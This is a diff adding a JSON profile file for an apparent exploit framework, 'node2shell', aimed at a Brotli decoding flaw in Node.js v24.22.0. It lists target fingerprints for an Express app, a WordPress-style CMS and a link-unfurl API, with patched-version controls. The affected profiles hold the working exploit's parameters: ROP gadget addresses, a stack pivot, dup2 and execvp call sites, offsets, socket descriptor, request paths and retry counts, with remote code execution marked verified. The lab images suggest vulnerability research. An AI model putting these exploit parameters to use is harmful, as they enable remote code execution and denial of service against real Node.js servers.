@@ -1,0 +1,401 @@
+{
+  "schema_version": 2,
+  "profiles": [
+    {
+      "id": "n2s-ref-express-24.22.0-x86_64",
+      "status": "RCE verified",
+      "default_mode": "rce",
+      "scope": "Exact Node.js v24.22.0 Express 5.3.0 fixture with body-parser 2.4.0, default express.json(), one libuv worker, and the restart supervisor",
+      "image": "node@sha256:925de64a85319052d6971ae81ef2417da956e8a3a2c4a0fac732327970f017f5",
+      "lab": {
+        "dockerfile": "lab/reference-express/Dockerfile",
+        "patched_dockerfile": "lab/reference-express/Dockerfile.patched",
+        "tag": "node2shell-lab:ref-24.22.0"
+      },
+      "fingerprint": {
+        "node_version": "v24.22.0",
+        "node_binary_sha256": "67ca5783febb8bf85736c79fcdd92c8d6d465a0eb2a082672bcdfa76a506751c",
+        "architecture": "x86_64",
+        "binary_format": "ELF64 ET_EXEC",
+        "application": "express 5.3.0",
+        "middleware": "body-parser 2.4.0",
+        "package_lock_sha256": "834ffe577323a01123d573160421c898ca3f16cc584fdbf02ca96930e3f621bc"
+      },
+      "probe": {
+        "interface": "loopback HTTP Brotli-encoded request body; id stdout returns on the exploited request socket",
+        "transport": "http-express-socket-rce",
+        "port": 3000,
+        "trigger_sha256": "b7a6508eb39ef57ae5e3fdf9aa85540071a06eff5d5b5a2d359fc8e1768e4df4",
+        "content_type": "application/json",
+        "body_limit": "default 100kb",
+        "prefix_size": 1031,
+        "copy_source_offset": "0x367",
+        "command_block_extra": "0xffffff",
+        "second_stage_size": 256,
+        "stage_delay_seconds": 0.5,
+        "restart_timeout_seconds": 8.0,
+        "attempts": 16,
+        "staged_positions": [
+          "0x137ed748"
+        ],
+        "write_wrap_compensation": "0x2800",
+        "accepted_socket_fd": 19,
+        "mov_rax_rdi_ret": "0x816750",
+        "pivot_rsp_rax_30_ret": "0x1fb97f8",
+        "pop_rsi_ret": "0x8a604e",
+        "store_rdi_plus_88_ret": "0x8bd991",
+        "pop_rbx_ret": "0x7f6143",
+        "pop_rdi_ret": "0x94fe4d",
+        "dup2_plt": "0x74d7f0",
+        "execvp_call_site": "0x1a3ebec",
+        "bss_base": "0x6bdfb00",
+        "proof": "fresh /usr/bin/id stdout containing uid= and gid= on the exploited HTTP connection",
+        "modes": {
+          "rce": {
+            "transport": "http-express-socket-rce",
+            "path": "/upload",
+            "crash_path": "/upload",
+            "content_type": "application/json"
+          },
+          "dos": {
+            "transport": "http-br-body",
+            "path": "/upload",
+            "content_type": "application/json"
+          }
+        }
+      },
+      "limitations": [
+        "Exact official Node.js v24.22.0 Linux x86-64 non-PIE binary and Debian bookworm userspace",
+        "Express 5.3.0 with body-parser 2.4.0 and default express.json()",
+        "UV_THREADPOOL_SIZE=1 and the included restart supervisor",
+        "The accepted exploit connection must be file descriptor 19",
+        "ASLR-dependent saved-return-address guess; placement is probabilistic and attempts without complete fresh id output fail closed"
+      ],
+      "evidence": "docs/evidence/ref-express-rce-run1.txt",
+      "evidence_files": [
+        "docs/evidence/ref-express-rce-run1.txt",
+        "docs/evidence/ref-express-rce-run2.txt",
+        "docs/evidence/ref-express-dos-run1.txt",
+        "docs/evidence/ref-express-dos-run2.txt"
+      ],
+      "tested_at": "2026-10-31"
+    },
+    {
+      "id": "n2s-wp-24.22.0-x86_64",
+      "status": "RCE verified",
+      "default_mode": "rce",
+      "scope": "Exact Node.js v24.22.0 WordPress-style CMS with route-scoped default express.json() on the media sink and a loopback URL import sink",
+      "image": "node@sha256:925de64a85319052d6971ae81ef2417da956e8a3a2c4a0fac732327970f017f5",
+      "lab": {
+        "dockerfile": "lab/wp-cms/Dockerfile",
+        "patched_dockerfile": "lab/wp-cms/Dockerfile.patched",
+        "tag": "node2shell-lab:wp-24.22.0"
+      },
+      "fingerprint": {
+        "node_version": "v24.22.0",
+        "node_binary_sha256": "67ca5783febb8bf85736c79fcdd92c8d6d465a0eb2a082672bcdfa76a506751c",
+        "architecture": "x86_64",
+        "binary_format": "ELF64 ET_EXEC",
+        "application": "Node2Shell Press (WordPress-style CMS)",
+        "middleware": "express 5.3.0 / body-parser 2.4.0",
+        "package_lock_sha256": "4b0c60b156f34582f50a2401075db790094e5993ffc2832aaa289bd88c534e61"
+      },
+      "probe": {
+        "interface": "loopback HTTP import sink and JSON media sink; id stdout would return on the exploited request socket",
+        "transport": "http-express-socket-rce",
+        "port": 3000,
+        "trigger_sha256": "b7a6508eb39ef57ae5e3fdf9aa85540071a06eff5d5b5a2d359fc8e1768e4df4",
+        "content_type": "application/json",
+        "body_limit": "default 100kb",
+        "prefix_size": 1031,
+        "copy_source_offset": "0x367",
+        "command_block_extra": "0xffffff",
+        "second_stage_size": 256,
+        "stage_delay_seconds": 0.5,
+        "restart_timeout_seconds": 8.0,
+        "attempts": 16,
+        "staged_positions": [
+          "0x137ed748"
+        ],
+        "accepted_socket_fd": 19,
+        "mov_rax_rdi_ret": "0x816750",
+        "pivot_rsp_rax_30_ret": "0x1fb97f8",
+        "pop_rsi_ret": "0x8a604e",
+        "store_rdi_plus_88_ret": "0x8bd991",
+        "pop_rbx_ret": "0x7f6143",
+        "pop_rdi_ret": "0x94fe4d",
+        "dup2_plt": "0x74d7f0",
+        "execvp_call_site": "0x1a3ebec",
+        "bss_base": "0x6bdfb00",
+        "proof": "fresh /usr/bin/id stdout containing uid= and gid= on the exploited HTTP connection",
+        "modes": {
+          "rce": {
+            "transport": "http-express-socket-rce",
+            "path": "/wp-json/wp/v2/media",
+            "crash_path": "/wp-json/wp/v2/media",
+            "content_type": "application/json"
+          },
+          "dos": {
+            "transport": "http-fetch",
+            "path": "/wp-json/node2shell/v1/import",
+            "method": "POST",
+            "origin_host": "host.docker.internal",
+            "origin_port": 4000,
+            "origin_bind": "127.0.0.1"
+          }
+        }
+      },
+      "limitations": [
+        "Exact official Node.js v24.22.0 Linux x86-64 non-PIE binary and Debian bookworm userspace",
+        "RCE, if it passes, is a claim only for this exact CMS and parser shape",
+        "The import sink and media sink have different application paths",
+        "ASLR-dependent saved-return-address guess; placement is probabilistic",
+        "The RCE attempt is recorded separately from the DoS claim"
+      ],
+      "evidence": "docs/evidence/wp-cms-rce-run1.txt",
+      "evidence_files": [
+        "docs/evidence/wp-cms-rce-run1.txt",
+        "docs/evidence/wp-cms-rce-run2.txt",
+        "docs/evidence/wp-cms-dos-run1.txt",
+        "docs/evidence/wp-cms-dos-run2.txt"
+      ],
+      "tested_at": "2026-10-31"
+    },
+    {
+      "id": "n2s-unfurl-24.22.0-x86_64",
+      "status": "DoS verified",
+      "default_mode": "dos",
+      "scope": "Exact Node.js v24.22.0 link unfurl API consuming an attacker-controlled Brotli HTTP response through undici 8.12.3",
+      "image": "node@sha256:925de64a85319052d6971ae81ef2417da956e8a3a2c4a0fac732327970f017f5",
+      "lab": {
+        "dockerfile": "lab/unfurl-api/Dockerfile",
+        "patched_dockerfile": "lab/unfurl-api/Dockerfile.patched",
+        "tag": "node2shell-lab:unfurl-24.22.0"
+      },
+      "fingerprint": {
+        "node_version": "v24.22.0",
+        "node_binary_sha256": "67ca5783febb8bf85736c79fcdd92c8d6d465a0eb2a082672bcdfa76a506751c",
+        "architecture": "x86_64",
+        "binary_format": "ELF64 ET_EXEC",
+        "application": "undici 8.12.3 link unfurl API",
+        "package_lock_sha256": "c198d2034e40ebd2ea4d0ceec3890ae81bc1bcf2f5d553feb21497723b629a21"
+      },
+      "probe": {
+        "interface": "loopback HTTP unfurl endpoint plus a loopback attacker origin",
+        "transport": "http-fetch",
+        "port": 3000,
+        "trigger_sha256": "b7a6508eb39ef57ae5e3fdf9aa85540071a06eff5d5b5a2d359fc8e1768e4df4",
+        "modes": {
+          "dos": {
+            "transport": "http-fetch",
+            "path": "/api/unfurl",
+            "method": "POST",
+            "origin_host": "host.docker.internal",
+            "origin_port": 4000,
+            "origin_bind": "127.0.0.1"
+          }
+        }
+      },
+      "limitations": [
+        "Affected Node.js v24.22.0 binary and undici 8.12.3 pin",
+        "The application must fetch and fully consume the encoded response",
+        "Only denial of service is claimed for this profile",
+        "No command execution or RCE is claimed"
+      ],
+      "evidence": "docs/evidence/unfurl-api-dos-run1.txt",
+      "evidence_files": [
+        "docs/evidence/unfurl-api-dos-run1.txt",
+        "docs/evidence/unfurl-api-dos-run2.txt"
+      ],
+      "tested_at": "2026-10-31"
+    },
+    {
+      "id": "n2s-ref-express-patched-24.22.1-x86_64",
+      "status": "Patched control",
+      "default_mode": "rce",
+      "expect": "fail_closed",
+      "scope": "Patched Node.js v24.22.1 control with the same reference Express source and package lock",
+      "image": "node@sha256:6449e19d8184d84062525b6a7524def03146c2cb04a7f08b076680d0e8e4240a",
+      "lab": {
+        "dockerfile": "lab/reference-express/Dockerfile.patched",
+        "tag": "node2shell-lab:ref-24.22.1"
+      },
+      "fingerprint": {
+        "node_version": "v24.22.1",
+        "node_binary_sha256": "e32e2d16081cf644f88392934288086e7662529d0d43277c34f7aad2207cfafb",
+        "architecture": "x86_64",
+        "binary_format": "ELF64 ET_EXEC",
+        "application": "express 5.3.0",
+        "middleware": "body-parser 2.4.0",
+        "package_lock_sha256": "834ffe577323a01123d573160421c898ca3f16cc584fdbf02ca96930e3f621bc"
+      },
+      "probe": {
+        "interface": "same loopback HTTP request as the affected profile",
+        "transport": "http-express-socket-rce",
+        "port": 3000,
+        "trigger_sha256": "b7a6508eb39ef57ae5e3fdf9aa85540071a06eff5d5b5a2d359fc8e1768e4df4",
+        "content_type": "application/json",
+        "prefix_size": 1031,
+        "copy_source_offset": "0x367",
+        "command_block_extra": "0xffffff",
+        "second_stage_size": 256,
+        "stage_delay_seconds": 0.5,
+        "restart_timeout_seconds": 8.0,
+        "attempts": 1,
+        "staged_positions": [
+          "0x137ed748"
+        ],
+        "accepted_socket_fd": 19,
+        "mov_rax_rdi_ret": "0x816750",
+        "pivot_rsp_rax_30_ret": "0x1fb97f8",
+        "pop_rsi_ret": "0x8a604e",
+        "store_rdi_plus_88_ret": "0x8bd991",
+        "pop_rbx_ret": "0x7f6143",
+        "pop_rdi_ret": "0x94fe4d",
+        "dup2_plt": "0x74d7f0",
+        "execvp_call_site": "0x1a3ebec",
+        "bss_base": "0x6bdfb00",
+        "modes": {
+          "rce": {
+            "transport": "http-express-socket-rce",
+            "path": "/upload",
+            "crash_path": "/upload",
+            "content_type": "application/json"
+          },
+          "dos": {
+            "transport": "http-br-body",
+            "path": "/upload",
+            "content_type": "application/json"
+          }
+        }
+      },
+      "limitations": [
+        "Control only; it is not evidence for any other patched release line",
+        "Confirms the same request fails closed on this pinned image"
+      ],
+      "evidence": "docs/evidence/ref-express-patched-control.txt",
+      "evidence_files": [
+        "docs/evidence/ref-express-patched-control.txt"
+      ],
+      "tested_at": "2026-10-31"
+    },
+    {
+      "id": "n2s-wp-patched-24.22.1-x86_64",
+      "status": "Patched control",
+      "default_mode": "rce",
+      "expect": "fail_closed",
+      "scope": "Patched Node.js v24.22.1 control with the same WordPress-style CMS source and package lock",
+      "image": "node@sha256:6449e19d8184d84062525b6a7524def03146c2cb04a7f08b076680d0e8e4240a",
+      "lab": {
+        "dockerfile": "lab/wp-cms/Dockerfile.patched",
+        "tag": "node2shell-lab:wp-24.22.1"
+      },
+      "fingerprint": {
+        "node_version": "v24.22.1",
+        "node_binary_sha256": "e32e2d16081cf644f88392934288086e7662529d0d43277c34f7aad2207cfafb",
+        "architecture": "x86_64",
+        "binary_format": "ELF64 ET_EXEC",
+        "application": "Node2Shell Press (WordPress-style CMS)",
+        "middleware": "express 5.3.0 / body-parser 2.4.0",
+        "package_lock_sha256": "4b0c60b156f34582f50a2401075db790094e5993ffc2832aaa289bd88c534e61"
+      },
+      "probe": {
+        "interface": "same loopback HTTP request as the affected CMS profile",
+        "transport": "http-express-socket-rce",
+        "port": 3000,
+        "trigger_sha256": "b7a6508eb39ef57ae5e3fdf9aa85540071a06eff5d5b5a2d359fc8e1768e4df4",
+        "content_type": "application/json",
+        "prefix_size": 1031,
+        "copy_source_offset": "0x367",
+        "command_block_extra": "0xffffff",
+        "second_stage_size": 256,
+        "stage_delay_seconds": 0.5,
+        "restart_timeout_seconds": 8.0,
+        "attempts": 1,
+        "staged_positions": [
+          "0x137ed748"
+        ],
+        "accepted_socket_fd": 19,
+        "mov_rax_rdi_ret": "0x816750",
+        "pivot_rsp_rax_30_ret": "0x1fb97f8",
+        "pop_rsi_ret": "0x8a604e",
+        "store_rdi_plus_88_ret": "0x8bd991",
+        "pop_rbx_ret": "0x7f6143",
+        "pop_rdi_ret": "0x94fe4d",
+        "dup2_plt": "0x74d7f0",
+        "execvp_call_site": "0x1a3ebec",
+        "bss_base": "0x6bdfb00",
+        "modes": {
+          "rce": {
+            "transport": "http-express-socket-rce",
+            "path": "/wp-json/wp/v2/media",
+            "crash_path": "/wp-json/wp/v2/media",
+            "content_type": "application/json"
+          },
+          "dos": {
+            "transport": "http-fetch",
+            "path": "/wp-json/node2shell/v1/import",
+            "method": "POST",
+            "origin_host": "host.docker.internal",
+            "origin_port": 4000,
+            "origin_bind": "127.0.0.1"
+          }
+        }
+      },
+      "limitations": [
+        "Control only; it is not evidence for any other patched release line",
+        "The same CMS and media route are retained"
+      ],
+      "evidence": "docs/evidence/wp-cms-patched-control.txt",
+      "evidence_files": [
+        "docs/evidence/wp-cms-patched-control.txt"
+      ],
+      "tested_at": "2026-10-31"
+    },
+    {
+      "id": "n2s-unfurl-patched-24.22.1-x86_64",
+      "status": "Patched control",
+      "default_mode": "dos",
+      "expect": "fail_closed",
+      "scope": "Patched Node.js v24.22.1 control with the same unfurl API source and undici pin",
+      "image": "node@sha256:6449e19d8184d84062525b6a7524def03146c2cb04a7f08b076680d0e8e4240a",
+      "lab": {
+        "dockerfile": "lab/unfurl-api/Dockerfile.patched",
+        "tag": "node2shell-lab:unfurl-24.22.1"
+      },
+      "fingerprint": {
+        "node_version": "v24.22.1",
+        "node_binary_sha256": "e32e2d16081cf644f88392934288086e7662529d0d43277c34f7aad2207cfafb",
+        "architecture": "x86_64",
+        "binary_format": "ELF64 ET_EXEC",
+        "application": "undici 8.12.3 link unfurl API",
+        "package_lock_sha256": "c198d2034e40ebd2ea4d0ceec3890ae81bc1bcf2f5d553feb21497723b629a21"
+      },
+      "probe": {
+        "interface": "same loopback fetch path as the affected unfurl profile",
+        "transport": "http-fetch",
+        "port": 3000,
+        "trigger_sha256": "b7a6508eb39ef57ae5e3fdf9aa85540071a06eff5d5b5a2d359fc8e1768e4df4",
+        "modes": {
+          "dos": {
+            "transport": "http-fetch",
+            "path": "/api/unfurl",
+            "method": "POST",
+            "origin_host": "host.docker.internal",
+            "origin_port": 4000,
+            "origin_bind": "127.0.0.1"
+          }
+        }
+      },
+      "limitations": [
+        "Control only; it is not evidence for any other patched release line",
+        "Confirms the decoder error is caught and the service stays available"
+      ],
+      "evidence": "docs/evidence/unfurl-api-patched-control.txt",
+      "evidence_files": [
+        "docs/evidence/unfurl-api-patched-control.txt"
+      ],
+      "tested_at": "2026-10-31"
+    }
+  ]
+}
